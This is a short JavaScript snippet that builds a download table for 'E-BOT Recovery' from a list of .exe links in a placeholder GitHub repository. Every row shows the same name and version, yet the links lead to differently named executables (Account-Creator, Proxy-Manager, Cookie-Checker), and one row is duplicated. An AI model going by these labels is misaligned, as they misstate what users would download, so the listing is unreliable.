const software = [

{
    Name:"📂 E-BOT Recovery",
    version:"v1.0.0",
    size:"152 MB",
    released:"18 Jul 2026",
    download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v2.1.0/E-BOT-Recovery.exe"
},

{
    Name:"📂 E-BOT Recovery",
    version:"v1.0.0",
    size:"149 MB",
    released:"16 Jul 2026",
    download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v1.5.2/Account-Creator.exe"
},

{
    Name:"📂 E-BOT Recovery",
    version:"v1.0.0",
    size:"138 MB",
    released:"10 Jul 2026",
    download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v3.0/Proxy-Manager.exe"
},

{
    Name:"📂 E-BOT Recovery",
    version:"v1.0.0",
    size:"138 MB",
    released:"10 Jul 2026",
    download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v3.0/Proxy-Manager.exe"
},

    
{
    Name:"📂 E-BOT Recovery",
    version:"v1.0.0",
    size:"157 MB",
    released:"03 Jul 2026",
    download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v4.4/Cookie-Checker.exe"
}

];

const table = document.getElementById("softwareTable");

software.forEach(item=>{

table.innerHTML += `

<tr>

<td>${item.Name}</td>

<td>${item.version}</td>

<td>${item.size}</td>

<td>${item.released}</td>

<td>

<a href="${item.download}">

<button>⬇ Download</button>

</a>

</td>

</tr>

`;

});
